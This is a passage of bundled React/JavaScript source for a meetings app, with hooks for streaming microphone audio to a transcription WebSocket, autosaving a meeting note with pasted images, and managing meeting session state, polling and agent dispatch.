				ws.onerror = () => reject(/* @__PURE__ */ new Error("open failed"));
				ws.onopen = () => resolve();
			});
		} catch {
			onErrorRef.current?.("connection");
			cleanup();
			return;
		}
		ws.onerror = () => {
			onErrorRef.current?.("connection");
		};
		const ctx = new AudioContext();
		ctxRef.current = ctx;
		try {
			await ctx.audioWorklet.addModule(PCM_WORKLET_URL);
		} catch {
			if (ctxRef.current !== ctx) return;
			onErrorRef.current?.("worklet");
			cleanup();
			return;
		}
		const source = ctx.createMediaStreamSource(stream);
		const node = new AudioWorkletNode(ctx, "pcm-worklet");
		let ready = false;
		let bufferedBytes = 0;
		const buffer = [];
		node.port.onmessage = (e) => {
			const chunk = e.data;
			if (ready) {
				if (ws.readyState === WebSocket.OPEN) try {
					ws.send(chunk);
				} catch {}
				return;
			}
			buffer.push(chunk);
			bufferedBytes += chunk.byteLength;
			while (bufferedBytes > MAX_BUFFERED_BYTES && buffer.length > 1) bufferedBytes -= buffer.shift().byteLength;
		};
		source.connect(node);
		if (wsRef.current !== ws) return;
		startingRef.current = false;
		setConnecting(true);
		lastFrameRef.current = Date.now();
		clearWatchdog();
		watchdogRef.current = setInterval(() => {
			if (stoppingRef.current || !wsRef.current) return;
			if (Date.now() - lastFrameRef.current > STALL_TIMEOUT_MS) {
				cleanup();
				start();
			}
		}, WATCHDOG_INTERVAL_MS);
		await readyPromise;
		const live = !stoppingRef.current && ws.readyState === WebSocket.OPEN && wsRef.current === ws;
		if (live) for (const chunk of buffer) try {
			ws.send(chunk);
		} catch {
			break;
		}
		buffer.length = 0;
		bufferedBytes = 0;
		ready = true;
		if (live) {
			setConnecting(false);
			setActive(true);
		}
	}, [
		cleanup,
		clearWatchdog,
		dispatchWithRetry
	]);
	const stop = useCallback(() => {
		stoppingRef.current = true;
		haltedRef.current = false;
		setHalted(false);
		clearWatchdog();
		const ws = wsRef.current;
		if (!ws || ws.readyState !== WebSocket.OPEN) {
			cleanup();
			return;
		}
		try {
			ws.send(STOP_FRAME);
		} catch {}
		window.setTimeout(() => {
			if (wsRef.current === ws) cleanup();
		}, CLOSE_GRACE_MS);
	}, [cleanup, clearWatchdog]);
	return {
		active,
		connecting,
		halted,
		isStarting: useCallback(() => startingRef.current, []),
		start,
		stop,
		supported: transcriptionSupported
	};
}
// src/hooks/useNoteDraft.ts
var nextImagePlaceholder = 0;
function insertPlaceholder(text, caret, token) {
	const at = Math.max(0, Math.min(caret, text.length));
	return `${text.slice(0, at)}${token}${text.slice(at)}`;
}
function replacePlaceholder(text, token, snippet) {
	const at = text.indexOf(token);
	if (at < 0) return text;
	const before = text.slice(0, at);
	const after = text.slice(at + token.length);
	if (snippet === null) return `${before}${after}`;
	return insertBlock(`${before}${after}`, before.length, snippet);
}
var IMAGE_PLACEHOLDER_PATTERN = /\uFDD0\d+\uFDD1/gu;
var IMAGE_PLACEHOLDER_DELIMITER = /[\uFDD0\uFDD1]/gu;
/** A fresh noncharacter token `\uFDD0<n>\uFDD1`; never user-visible copy. */
function nextImagePlaceholderToken() {
	return String.fromCodePoint(64976) + String(++nextImagePlaceholder) + String.fromCodePoint(64977);
}
function stripImagePlaceholders(text) {
	return text.replace(IMAGE_PLACEHOLDER_PATTERN, "").replace(IMAGE_PLACEHOLDER_DELIMITER, "");
}
/**
* A refusal no retry of the same request can turn into a save: the caller is not
* the dashboard owner, or the meeting is gone. Holding the user in the view on one
* of these keeps them in front of a note that can never land, so `exit` lets
* them leave instead.
*
* The host's owner gate answers `owner_only`; the built-in's own gate answered
* `dashboard_owner_required`, which an older backend still sends.
*/
var OWNER_REFUSAL_CODES = /* @__PURE__ */ new Set(["owner_only", "dashboard_owner_required"]);
function isPermanentSaveRefusal(error) {
	if (!(error instanceof MeetingsApiError)) return false;
	return error.status === 403 && OWNER_REFUSAL_CODES.has(error.code) || error.status === 404;
}
/**
* The server answered with the note as stored, having dropped this save because a
* NEWER one from the same page was already on disk (see
* `useMeetingSession`'s note order).
*/
function isSuperseded(response) {
	return typeof response === "object" && response !== null && response.superseded === true;
}
function useNoteDraft({ meetingId, serverContent, loadFailed, save, saveNow, uploadImage }) {
	const [draft, setDraftState] = useState("");
	const [baseline, setBaselineState] = useState(null);
	const [pendingSaves, setPendingSaves] = useState(0);
	const [saveFailed, setSaveFailed] = useState(false);
	const [pendingUploads, setPendingUploads] = useState(0);
	const [uploadError, setUploadError] = useState(null);
	const draftRef = useRef(draft);
	const baselineRef = useRef(baseline);
	const setDraft = (value) => {
		draftRef.current = value;
		setDraftState(value);
	};
	const setBaseline = (value) => {
		baselineRef.current = value;
		setBaselineState(value);
	};
	const meetingIdRef = useRef(meetingId);
	const loadFailedRef = useRef(loadFailed);
	loadFailedRef.current = loadFailed;
	const saveRef = useRef(save);
	saveRef.current = save;
	const saveNowRef = useRef(saveNow);
	saveNowRef.current = saveNow;
	const uploadRef = useRef(uploadImage);
	uploadRef.current = uploadImage;
	const timerRef = useRef(null);
	const inFlightRef = useRef(null);
	const sendSeqRef = useRef(0);
	const ackedSeqRef = useRef(0);
	const pendingTokensRef = useRef(/* @__PURE__ */ new Set());
	const uploadsRef = useRef(/* @__PURE__ */ new Set());
	const permanentRefusalRef = useRef(false);
	const clearTimer = () => {
		if (timerRef.current) {
			clearTimeout(timerRef.current);
			timerRef.current = null;
		}
	};
	useEffect(() => {
		if (meetingIdRef.current !== meetingId) {
			meetingIdRef.current = meetingId;
			clearTimer();
			inFlightRef.current = null;
			sendSeqRef.current = 0;
			ackedSeqRef.current = 0;
			pendingTokensRef.current.clear();
			uploadsRef.current.clear();
			permanentRefusalRef.current = false;
			setPendingSaves(0);
			setPendingUploads(0);
			setSaveFailed(false);
			setUploadError(null);
			setDraft(serverContent ?? "");
			setBaseline(serverContent ?? null);
			return;
		}
		if (serverContent === void 0) return;
		const previous = baselineRef.current;
		if (serverContent === previous) return;
		if (previous === null || draftRef.current === previous) setDraft(serverContent);
		setBaseline(serverContent);
	}, [meetingId, serverContent]);
	const send = useCallback((text, direct = false) => {
		const seq = ++sendSeqRef.current;
		const sendMeetingId = meetingIdRef.current;
		let settle = () => {};
		const done = new Promise((resolve) => {
			settle = resolve;
		});
		inFlightRef.current = {
			text,
			done
		};
		setPendingSaves((n) => n + 1);
		(async () => {
			let landed = false;
			try {
				const response = await (direct ? saveNowRef : saveRef).current(text);
				landed = true;
				if (isSuperseded(response)) return;
				if (meetingIdRef.current === sendMeetingId && seq > ackedSeqRef.current) {
					ackedSeqRef.current = seq;
					permanentRefusalRef.current = false;
					setBaseline(text);
					setSaveFailed(false);
				}
			} catch (error) {
				if (meetingIdRef.current === sendMeetingId) {
					permanentRefusalRef.current = isPermanentSaveRefusal(error);
					setSaveFailed(true);
				}
			} finally {
				if (meetingIdRef.current === sendMeetingId) {
					if (inFlightRef.current?.text === text) inFlightRef.current = null;
					setPendingSaves((n) => n - 1);
				}
				settle(landed);
			}
		})();
		return done;
	}, []);
	/**
	* One flush. Resolves with whether the note is on disk afterwards: `true` when
	* the save landed or nothing needed saving, `false` when it was refused.
	*
	* A pending upload holds an ordinary flush back: its placeholder must not reach
	* disk, and the upload is about to resolve into a hook that is still here. `exit`
	* waits for uploads before it calls this, so only `unload`, which has no "later",
	* normally reaches it with one pending; the text is then saved with the
	* unresolved token removed instead of not at all. The token stays in the FIELD
	* in that case, so the upload may yet land in its place.
	*/
	const flushImpl = useCallback((mode) => {
		clearTimer();
		if (loadFailedRef.current || baselineRef.current === null) return Promise.resolve(true);
		const uploadsPending = pendingTokensRef.current.size > 0;
		if (uploadsPending && mode === "normal") return Promise.resolve(true);
		const rawText = draftRef.current;
		const text = stripImagePlaceholders(rawText);
		if (text !== rawText && !uploadsPending) setDraft(text);
		const inFlight = inFlightRef.current;
		const direct = mode === "pagehide";
		if (inFlight?.text === text && !direct) return inFlight.done;
		if (inFlight && (direct || mode === "unload")) return send(text, direct);
		if (inFlight) return inFlight.done.then(() => flushImpl(mode));
		if (text === baselineRef.current) return Promise.resolve(true);
		return send(text, direct);
	}, [send]);
	const flush = useCallback(() => {
		flushImpl("normal");
	}, [flushImpl]);
	const exit = useCallback(async () => {
		const exitMeetingId = meetingIdRef.current;
		for (;;) {
			if (meetingIdRef.current !== exitMeetingId) return true;
			const uploads = [...uploadsRef.current];
			if (uploads.length > 0) {
				await Promise.allSettled(uploads);
				continue;
			}
			if (!await flushImpl("exit")) return permanentRefusalRef.current;
			if (meetingIdRef.current !== exitMeetingId) return true;
			if (loadFailedRef.current || baselineRef.current === null) return true;
			if (uploadsRef.current.size > 0) continue;
			if (stripImagePlaceholders(draftRef.current) === baselineRef.current) return true;
		}
	}, [flushImpl]);
	const change = useCallback((value) => {
		setDraft(value);
		setUploadError(null);
		clearTimer();
		timerRef.current = setTimeout(flush, 800);
	}, [flush]);
	const pasteImage = useCallback((file, caret) => {
		if (loadFailedRef.current || baselineRef.current === null) return;
		setUploadError(null);
		const token = nextImagePlaceholderToken();
		pendingTokensRef.current.add(token);
		setPendingUploads((n) => n + 1);
		change(insertPlaceholder(draftRef.current, caret, token));
		const finish = (snippet, refusal) => {
			let error = refusal;
			if (!pendingTokensRef.current.delete(token)) return;
			let next = replacePlaceholder(draftRef.current, token, snippet);
			if (snippet !== null && stripImagePlaceholders(next).length > 1e5) {
				next = replacePlaceholder(draftRef.current, token, null);
				error = "tooLarge";
			}
			change(next);
			if (error) setUploadError(error);
			setPendingUploads((n) => n - 1);
		};
		const uploads = uploadsRef.current;
		const upload = (async () => {
			try {
				const stored = await uploadRef.current(file);
				finish(imageSnippet(stored.alt, stored.src), null);
			} catch (error) {
				const tooLarge = error instanceof MeetingsApiError && error.status === 413;
				finish(null, tooLarge ? "tooLarge" : "failed");
			}
		})();
		uploads.add(upload);
		upload.finally(() => {
			uploads.delete(upload);
		});
	}, [change]);
	const flushImplRef = useRef(flushImpl);
	flushImplRef.current = flushImpl;
	useEffect(() => {
		const tokens = pendingTokensRef.current;
		const uploads = uploadsRef.current;
		const timer = timerRef;
		return () => {
			flushImplRef.current("unload");
			if (timer.current) clearTimeout(timer.current);
			timer.current = null;
			tokens.clear();
			uploads.clear();
		};
	}, []);
	useEffect(() => {
		const onPageHide = () => {
			flushImplRef.current("pagehide");
		};
		window.addEventListener("pagehide", onPageHide);
		return () => window.removeEventListener("pagehide", onPageHide);
	}, []);
	return {
		draft,
		dirty: baseline !== null && draft !== baseline,
		loaded: baseline !== null,
		saving: pendingSaves > 0,
		saveFailed,
		uploading: pendingUploads > 0,
		uploadError,
		change,
		flush,
		exit,
		pasteImage
	};
}
// src/hooks/useMeetingSession.ts
/** One id per meeting view, naming it as a note editor; only uniqueness matters. */
function newNoteEditorId() {
	const uuid = globalThis.crypto?.randomUUID?.();
	if (uuid) return uuid;
	return `${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 12)}`;
}
/** Transcript segments arrive with overlap; a repeat inside this window is dropped. */
var DEDUP_WINDOW_MS = 5e3;
/**
* Poll cadence while a start is in flight.
*
* Deliberately faster than `poll_interval_active`: this window is short and the
* whole point is to notice `active` promptly, so the Live badge and the meeting
* controls come alive instead of looking dead. Not configurable, because it is
* not a steady-state cost — at most a handful of requests, once per start.
*/
var START_POLL_MS = 1e3;
/**
* Transcription failure code -> catalog key.
*
* FILE SCOPE, not inline in the handler that indexes it: `check-i18n-keys.mjs`
* collects only file-scope consts, so the same map declared inside the callback
* resolved to nothing and all five keys went unverified — exempt from the
* existence, parity and dead-key checks. Hoisting it is what makes them checked.
*/
var STT_ERROR_KEY = {
	dispatch: "apps.meetings.session.sttDispatchFailed",
	unsupported: "apps.meetings.session.sttUnsupported",
	microphone: "apps.meetings.session.sttMicDenied",
	worklet: "apps.meetings.session.sttWorkletFailed",
	connection: "apps.meetings.session.sttConnectionFailed",
	disconnected: "apps.meetings.session.sttDisconnected",
	stt_streaming_disabled: "apps.meetings.session.sttStreamingDisabled"
};
/**
* The copy for a 409 start refusal. One helper so the inline notice and the
* toast of every other mutation that hits the latch cannot drift apart.
*/
function conflictMessage(error) {
	const title = error.blockingMeetingTitle;
	if (!title) return i18nT("apps.meetings.session.anotherMeetingActive");
	return error.blockingMeetingStatus === "reviewing" ? i18nT("apps.meetings.session.anotherMeetingReviewing", { title }) : i18nT("apps.meetings.session.anotherMeetingActiveNamed", { title });
}
/**
* The part of *text* the agents have not already been sent, or "" for a repeat.
*
* STT emits a GROWING final: `"yes"` and then `"yes please"` within the dedup
* window. `isDuplicateSegment` correctly says the second overlaps the first — but
* suppressing it outright discarded the new words, so the notes and task
* extraction never saw "please". Whole clauses vanished this way whenever the
* recognizer revised upward, which for short affirmations is most of the time.
*
* The extension case is therefore split from the true-repeat case: a segment that
* STARTS WITH what was already dispatched contributes only its new suffix, and
* anything else (an exact repeat, or a shorter re-recognition already covered)
* contributes nothing. Returning the suffix rather than the whole text is what
* keeps the agents from seeing "yes" twice.
*/
function newSegmentText(text, previous, now) {
	const trimmed = text.trim();
	if (!trimmed) return "";
	if (now - previous.ts >= DEDUP_WINDOW_MS || !previous.text) return trimmed;
	if (trimmed === previous.text) return "";
	if (trimmed.startsWith(previous.text)) return trimmed.slice(previous.text.length).trim();
	if (previous.text.includes(trimmed)) return "";
	return trimmed;
}
/** Merge cursor pages and immediate dispatch responses by durable segment id. */
function mergeTranscriptSegments(current, incoming) {
	if (incoming.length === 0) return [...current];
	const seen = new Set(current.map((segment) => segment.id));
	const merged = [...current];
	for (const segment of incoming) {
		if (seen.has(segment.id)) continue;
		seen.add(segment.id);
		merged.push(segment);
	}
	return merged;
}
/** Reconcile a canonical cursor page with responses appended optimistically. */
function reconcileTranscriptPage(current, page) {
	if (page.length === 0) return [...current];
	const confirmedIds = new Set(page.map((segment) => segment.id));
	return [...current.filter((segment) => !confirmedIds.has(segment.id)), ...page];
}
/** Which agents a preset (or the roster's defaults) turns on. */
function resolveEnabledAgents(presetName, config, agents) {
	const preset = presetName ? config?.presets?.[presetName] : void 0;
	if (preset?.enabled_agents?.length) return preset.enabled_agents;
	return agents.filter((a) => a.enabled_by_default !== false).map((a) => a.id);
}
/**
* Poll cadence for a meeting's metadata query, or `false` for "do not poll".
*
* The `startInFlight` rule is the load-bearing one. `POST /start` does not answer
* until EVERY agent has been initialized, and that is a sequence of awaited agent
* dispatches — tens of seconds with the default roster (measured: ~46s for three).
* The meeting is already `active` on the server for almost all of that, because the
* status is persisted up front, BEFORE the dispatches begin. So the wait gates
* nothing except this client's knowledge of it.
*
* Without the rule that was enough to look like a broken button: polling is off
* while `idle`, so with no poll and no resolved mutation the UI sat on a stale
* `idle` for the whole initialization — Start greyed out (it is disabled while the
* mutation is pending), no Live badge, and, because the microphone is bound to
* `status`, no permission prompt and no capture at all. The only way through was a
* manual reload, whose fresh fetch saw `active` and brought the meeting to life.
* Users reasonably concluded that recording does not start without a reload.
*
* Checked LAST so a known status always wins: once a poll lands and `status` is
* `active`, the caller's configured cadence takes over and this rule goes quiet on
* its own.
*/
function metaPollInterval(opts) {
	const { status, startInFlight, activeMs, idleMs } = opts;
	if (status === "active") return activeMs ?? 5e3;
	if (status === "paused" || status === "reviewing") return idleMs ?? 3e4;
	if (startInFlight) return START_POLL_MS;
	return false;
}
/**
* Whether the microphone may open for an `active` meeting.
*
* `status === 'active'` alone is NOT dispatch readiness. `POST /start` persists
* `active` up front and then initializes agents with transcript ingress
* SUSPENDED for direct fan-out. The fast start poll exists to observe `active`
* early, so without a readiness gate it opened the microphone tens of seconds
* before ingress: early finals burned through the short dispatch retry schedule
* (~4.6s) against a ~46s initialization and were PERMANENTLY lost from the notes
* and tasks.
*
* That gate cost the opening of every meeting instead — the mic simply stayed
* shut for those ~46s and the speech was never captured at all (issue #4610).
* The server now HOLDS speech through initialization, so there are two states in
* which a line lands: fanned out immediately (`accepting_dispatches`) or held and
* replayed in order when the agents are ready (`buffering_dispatches`). Capture
* must open for BOTH, and a server that reports neither is still the closed case
* this gate was written for — stopping, reviewing, expired, or no live session.
*
* `ingressReady` is that pair of server flags, reported on every meta poll — the
* same holder state the dispatch endpoint itself checks. Gating on the POLLED
* value rather than on the start
* mutation's lifecycle makes every client-side inference hole unreachable at
* once, because the mutation's outcome is not evidence about ingress in either
* direction: an error settlement can hide a server-side success (the ~46s
* request is exactly the shape a proxy timeout kills), and a success response
* can be lost in transit. With the polled flag, the mic simply follows what
* the server reports: closed while initialization holds ingress shut, open on
* the first poll after `resume_dispatches` — whatever became of the start
* request itself. A reload or a second tab lands on the same rule, which also
* closes the pre-existing hole where a tab that never started the meeting
* opened its mic mid-initialization.
*
* The Live badge and controls still key off `status` and appear within ~1s of
* Start; only capture waits for the server to report ingress open.
*/
function canOpenTranscription(opts) {
	const { status, ingressReady, transcriptFull } = opts;
	return status === "active" && ingressReady && !transcriptFull;
}
function useMeetingSession({ eventId, fallbackTitle, config, notify }) {
	const queryClient = useQueryClient();
	const meetingId = useMemo(() => safeMeetingId(eventId), [eventId]);
	const scope = ["meetings", meetingId];
	const [caption, setCaption] = useState("");
	/** The last transcription error, for the in-page ErrorNotice. Cleared when
	*  status leaves 'active', when transcription comes back, or on a new Start. */
	const [transcriptionError, setTranscriptionError] = useState(null);
	const transcriptionErrorMessage = transcriptionError?.message ?? null;
	const transcriptionErrorCode = transcriptionError?.code ?? null;
	const [partialTranscript, setPartialTranscript] = useState("");
	const [fullMeetingId, setFullMeetingId] = useState("");
	const transcriptFullNoticeRef = useRef("");
	const [noteOpen, setNoteOpen] = useState(false);
	const [translationOpen, setTranslationOpen] = useState(false);
	const [chatViewAgents, setChatViewAgents] = useState([]);
	const [selectedPreset, setSelectedPreset] = useState(config?.default_preset ?? "");
	const presetAppliedRef = useRef(false);
	useEffect(() => {
		const preset = config?.default_preset;
		if (!preset || presetAppliedRef.current) return;
		presetAppliedRef.current = true;
		setSelectedPreset((current) => current || preset);
	}, [config?.default_preset]);
	const lastSegmentRef = useRef({
		text: "",
		ts: 0
	});
	const initQuery = useQuery({
		queryKey: [...scope, "init"],
		queryFn: () => meetingsApi.init(meetingId, fallbackTitle || i18nT("apps.meetings.session.untitled")),
		staleTime: Infinity,
		retry: 1
	});
	const [startInFlight, setStartInFlight] = useState(false);
	const statusInFlightRef = useRef(false);
	const metaQuery = useQuery({
		queryKey: [...scope, "meta"],
		queryFn: () => meetingsApi.meeting(meetingId),
		enabled: initQuery.isSuccess,
		refetchInterval: (query) => metaPollInterval({
			status: query.state.data?.meta?.status,
			startInFlight,
			activeMs: config?.poll_interval_active,
			idleMs: config?.poll_interval_idle
		})
	});
	const meta = metaQuery.data?.meta;
	const status = meta?.status ?? "idle";
	/** Read by the transcription error callback, which must not re-bind per status. */
	const statusRef = useRef(status);
	statusRef.current = status;
	const live = metaQuery.data?.live ?? null;
	const ingressReady = live?.accepting_dispatches === true || live?.buffering_dispatches === true;
	const outputsQuery = useQuery({
		queryKey: [...scope, "outputs"],
		queryFn: () => meetingsApi.outputs(meetingId),
		enabled: initQuery.isSuccess,
		refetchInterval: status === "active" ? config?.poll_interval_active ?? 5e3 : status === "paused" || status === "reviewing" ? config?.poll_interval_idle ?? 3e4 : false
	});
	const transcriptKey = [...scope, "transcript"];
	const transcriptQuery = useQuery({
		queryKey: transcriptKey,
		queryFn: async () => {
			const current = queryClient.getQueryData(transcriptKey);
			const page = await meetingsApi.transcript(meetingId, current?.next_cursor ?? 0);
			if (!current) return page;
			return {
				segments: reconcileTranscriptPage(current.segments, page.segments),
				next_cursor: page.next_cursor
			};
		},
		enabled: initQuery.isSuccess,
		refetchInterval: status === "active" ? config?.poll_interval_active ?? 5e3 : status === "paused" || status === "reviewing" ? config?.poll_interval_idle ?? 3e4 : false
	});
	const noteQuery = useQuery({
		queryKey: [...scope, "note"],
		queryFn: () => meetingsApi.note(meetingId),
		enabled: initQuery.isSuccess && noteOpen,
		refetchInterval: false,
		refetchOnWindowFocus: false
	});
	const noteLoadFailed = noteQuery.isError && noteQuery.data === void 0;
	const noteEditorRef = useRef(null);
	noteEditorRef.current ??= newNoteEditorId();
	const noteSeqRef = useRef(0);
	const nextNoteOrder = () => ({
		editor: noteEditorRef.current ?? newNoteEditorId(),
		seq: ++noteSeqRef.current
	});
	const noteMutation = useMutation({
		mutationFn: ({ content, order }) => meetingsApi.saveNote(meetingId, content, { order }),
		onSuccess: (response) => {
			queryClient.setQueryData([...scope, "note"], {
				content: response.content,
				updated_at: response.updated_at,
				path: response.path
			});
		},
		onError: () => notify(i18nT("apps.meetings.session.noteSaveFailed"), { type: "error" }),
		scope: { id: `meetings-note-${meetingId}` }
	});
	/**
	* Store one pasted image, resolving with the markdown pieces to insert.
	*
	* Throws on refusal — the draft hook classifies the error for its in-panel notice
	* — after reporting it to the notification feed, which is the one surface still
	* showing when the paste completes after the panel has been closed. The two cases
	* worth distinguishing are the ones the user can act on: shrink the image, or
	* paste a different format.
	*/
	const uploadNoteImage = useCallback(async (file) => {
		try {
			const stored = await meetingsApi.uploadNoteImage(meetingId, file);
			return {
				alt: stored.alt,
				src: stored.src
			};
		} catch (error) {
			notify(i18nT(error instanceof MeetingsApiError && error.status === 413 ? "apps.meetings.session.noteImageTooLarge" : "apps.meetings.session.noteImageFailed"), { type: "error" });
			throw error;
		}
	}, [meetingId, notify]);
	const noteDraft = useNoteDraft({
		meetingId,
		serverContent: noteQuery.data?.content,
		loadFailed: noteLoadFailed,
		save: (content) => noteMutation.mutateAsync({
			content,
			order: nextNoteOrder()
		}),
		saveNow: (content) => meetingsApi.saveNote(meetingId, content, {
			keepalive: true,
			order: nextNoteOrder()
		}),
		uploadImage: uploadNoteImage
	});
	const translationLinesRef = useRef(/* @__PURE__ */ new Map());
	const translationCursorRef = useRef(0);
	const translationLanguage = config?.translation_language ?? "";
	const lastTranslationLanguageRef = useRef(translationLanguage);
	if (lastTranslationLanguageRef.current !== translationLanguage) {
		lastTranslationLanguageRef.current = translationLanguage;
		translationLinesRef.current = /* @__PURE__ */ new Map();
		translationCursorRef.current = 0;
	}
	const lastServerLanguageRef = useRef("");
	const translationQuery = useQuery({
		queryKey: [...scope, "translations"],
		queryFn: async () => {
			let page = await meetingsApi.translations(meetingId, translationCursorRef.current);
			if (page.language !== lastServerLanguageRef.current) {
				lastServerLanguageRef.current = page.language;
				translationLinesRef.current = /* @__PURE__ */ new Map();
				if (translationCursorRef.current !== 0) {
					translationCursorRef.current = 0;
					page = await meetingsApi.translations(meetingId, 0);
				}
			}
			for (const line of page.lines) translationLinesRef.current.set(line.n, line);
			translationCursorRef.current = page.next_n;
			return {
				lines: [...translationLinesRef.current.values()].sort((a, b) => a.n - b.n),
				pending: page.pending,
				dropped: page.dropped,
				language: page.language,
				languageLabel: page.language_label
			};
		},
		enabled: initQuery.isSuccess && translationOpen && Boolean(translationLanguage),
		refetchInterval: status === "active" ? config?.poll_interval_active ?? 5e3 : status === "paused" || status === "reviewing" ? config?.poll_interval_idle ?? 3e4 : false
	});
	const editOutputMutation = useMutation({
		mutationFn: ({ agentId, content }) => meetingsApi.saveOutput(meetingId, agentId, content),
		onSuccess: () => queryClient.invalidateQueries({ queryKey: [...scope, "outputs"] }, { throwOnError: true }),
		onError: () => notify(i18nT("apps.meetings.session.minutesSaveFailed"), { type: "error" })
	});
	const revertOutputMutation = useMutation({
		mutationFn: (agentId) => meetingsApi.revertOutput(meetingId, agentId),
		onSuccess: () => queryClient.invalidateQueries({ queryKey: [...scope, "outputs"] }, { throwOnError: true }),
		onError: () => notify(i18nT("apps.meetings.session.minutesRevertFailed"), { type: "error" })
	});
	const agents = config?.meeting_agents ?? [];
	const enabledIds = meta?.agents_enabled ?? resolveEnabledAgents(selectedPreset, config, agents);
	const rosterIsKnown = Boolean(meta?.agents_enabled) || Boolean(config);
	const enabledAgents = useMemo(() => agents.filter((a) => enabledIds.includes(a.id)), [agents, enabledIds.join(",")]);
	const mutedAgents = meta?.muted_agents ?? [];
	const outputs = outputsQuery.data?.outputs ?? {};
	const outputEdits = outputsQuery.data?.edits ?? {};
	const tasks = outputsQuery.data?.tasks ?? [];
	const transcript = transcriptQuery.data?.segments ?? [];
	const transcriptFull = fullMeetingId === meetingId;
	const commitTranscriptSegment = useCallback((segment) => {
		queryClient.setQueryData(transcriptKey, (current) => {
			return {
				segments: mergeTranscriptSegments(current?.segments ?? [], [segment]),
				next_cursor: current?.next_cursor ?? 0
			};
		});
	}, [queryClient, meetingId]);
	const markTranscriptFull = useCallback(() => {
		setFullMeetingId(meetingId);
		if (transcriptFullNoticeRef.current === meetingId) return;
		transcriptFullNoticeRef.current = meetingId;
		notify(i18nT("apps.meetings.transcript.full"), { type: "error" });
	}, [meetingId, notify]);
	const invalidate = useCallback(() => {
		queryClient.invalidateQueries({ queryKey: [...scope, "meta"] });
		queryClient.invalidateQueries({ queryKey: [...scope, "outputs"] });
		queryClient.invalidateQueries({ queryKey: [...scope, "transcript"] });
	}, [queryClient, meetingId]);
	const transcription = useMeetingTranscription({
		meetingId,
		onCaption: useCallback((text) => setCaption(text), []),
		onFinal: useCallback((text) => {
			const now = Date.now();
			const fresh = newSegmentText(text, lastSegmentRef.current, now);
			if (!fresh) return false;
			lastSegmentRef.current = {
				text: text.trim(),
				ts: now
			};
			return fresh;
		}, []),
		onPartial: setPartialTranscript,
		onCommitted: commitTranscriptSegment,
		onError: useCallback((code) => {
			if (code === "transcript_full") {
				markTranscriptFull();
				return;
			}
			const localizedMessage = i18nT(code in STT_ERROR_KEY ? STT_ERROR_KEY[code] : "apps.meetings.session.sttUnavailable");
			if (statusRef.current === "active") setTranscriptionError({
				code,
				message: localizedMessage
			});
			else notify(localizedMessage, { type: "error" });
		}, [markTranscriptFull, notify])
	});
	const transcriptionRef = useRef(transcription);
	transcriptionRef.current = transcription;
	const transcriptionActive = transcription.active;
	const transcriptionConnecting = transcription.connecting;
	const transcriptionHalted = transcription.halted;
	useEffect(() => {
		const mayOpen = canOpenTranscription({
			status,
			ingressReady,
			transcriptFull
		});
		const t = transcriptionRef.current;
		if (mayOpen && !t.active && !t.connecting && !t.halted) t.start();
		if (!mayOpen && (t.active || t.connecting || t.halted || t.isStarting())) t.stop();
	}, [
		status,
		ingressReady,
		transcriptFull,
		transcriptionActive,
		transcriptionConnecting,
		transcriptionHalted
	]);
	useEffect(() => {
		if (transcriptionActive) setTranscriptionError(null);
	}, [transcriptionActive]);
	useEffect(() => {
		if (status !== "active") setTranscriptionError(null);
	}, [status]);
	/**
	* Notify a mutation failure, special-casing the 409 "another meeting is active".
	*
	* Takes the fallback as TRANSLATED TEXT, not as a catalog key. Passing a key
	* meant the only `i18nT` was `i18nT(fallbackKey)` inside here, which
	* `check-i18n-keys.mjs` cannot resolve — so all nine fallback keys were
	* unverifiable and exempt from the existence, parity and dead-key checks, even
	* though every call site passes a plain literal. Translating at the call site
	* puts them all back under the gate for the cost of nine `i18nT(...)` wrappers.
	*/
	const failureNotice = useCallback((error, fallback) => {
		notify(error instanceof MeetingsApiError && error.status === 409 ? conflictMessage(error) : fallback, { type: "error" });
	}, [notify]);
	const startMutation = useMutation({
		mutationFn: (opts) => meetingsApi.start(meetingId, {
			title: meta?.title ? void 0 : fallbackTitle,
			preset: selectedPreset || void 0,
			agents_enabled: rosterIsKnown ? enabledIds : void 0,
			muted_agents: mutedAgents,
			restart: opts.restart
		}),
		onMutate: () => {
			setStartInFlight(true);
			setTranscriptionError(null);
		},
		onSettled: () => setStartInFlight(false),
		onSuccess: () => {
			notify(i18nT("apps.meetings.session.started"), { type: "success" });
			invalidate();
		}
	});
	const resetStart = startMutation.reset;
	useEffect(() => {
		if (status === "active" || status === "paused" || status === "reviewing") resetStart();
	}, [status, resetStart]);
	const statusMutation = useMutation({
		mutationFn: (next) => meetingsApi.setStatus(meetingId, next),
		onSettled: async () => {
			try {
				await Promise.all([
					queryClient.invalidateQueries({ queryKey: [...scope, "meta"] }),
					queryClient.invalidateQueries({ queryKey: [...scope, "outputs"] }),
					queryClient.invalidateQueries({ queryKey: [...scope, "transcript"] })
				]);
			} finally {
				statusInFlightRef.current = false;
			}
		},
		onError: (error) => failureNotice(error, i18nT("apps.meetings.session.statusFailed"))
	});
	const requestStatus = (next) => {
		if (statusInFlightRef.current) return;
		statusInFlightRef.current = true;
		statusMutation.mutate(next);
	};
	const stopMutation = useMutation({
		mutationFn: () => meetingsApi.stop(meetingId),
		onSuccess: () => {
			notify(i18nT("apps.meetings.session.ended"), { type: "info" });
			invalidate();
			queryClient.invalidateQueries({ queryKey: ["meetings", "list"] });
		},
		onError: (error) => failureNotice(error, i18nT("apps.meetings.session.stopFailed"))
	});
	const renameMutation = useMutation({
		mutationFn: (title) => meetingsApi.renameMeeting(meetingId, title),
		onSuccess: ({ meta: saved }) => {
			queryClient.setQueryData([...scope, "meta"], (old) => old ? {
				...old,
				meta: {
					...old.meta,
					title: saved.title
				}
			} : old);
			queryClient.invalidateQueries({ queryKey: ["meetings", "list"] });
		}
	});
	const muteMutation = useMutation({
		mutationFn: (vars) => meetingsApi.mute(meetingId, vars.agentId, vars.muted),
		onSuccess: () => invalidate()
	});
	const toggleAgentMutation = useMutation({
		mutationFn: (vars) => meetingsApi.toggleAgent(meetingId, vars.agentId, vars.enable),
		onSuccess: () => invalidate(),
		onError: (error) => failureNotice(error, i18nT("apps.meetings.session.agentToggleFailed"))
	});
	const broadcastMutation = useMutation({
		mutationFn: (text) => meetingsApi.dispatch(meetingId, text, true),
		onSuccess: (response) => {
			commitTranscriptSegment(response.segment);
			notify(i18nT("apps.meetings.session.broadcastSent"), { type: "info" });
		},
		onError: (error) => {
			if (error instanceof MeetingsApiError && error.status === 413 && error.code === "transcript_too_large") {
				markTranscriptFull();
				return;
			}
			failureNotice(error, i18nT("apps.meetings.session.broadcastFailed"));
		}
	});
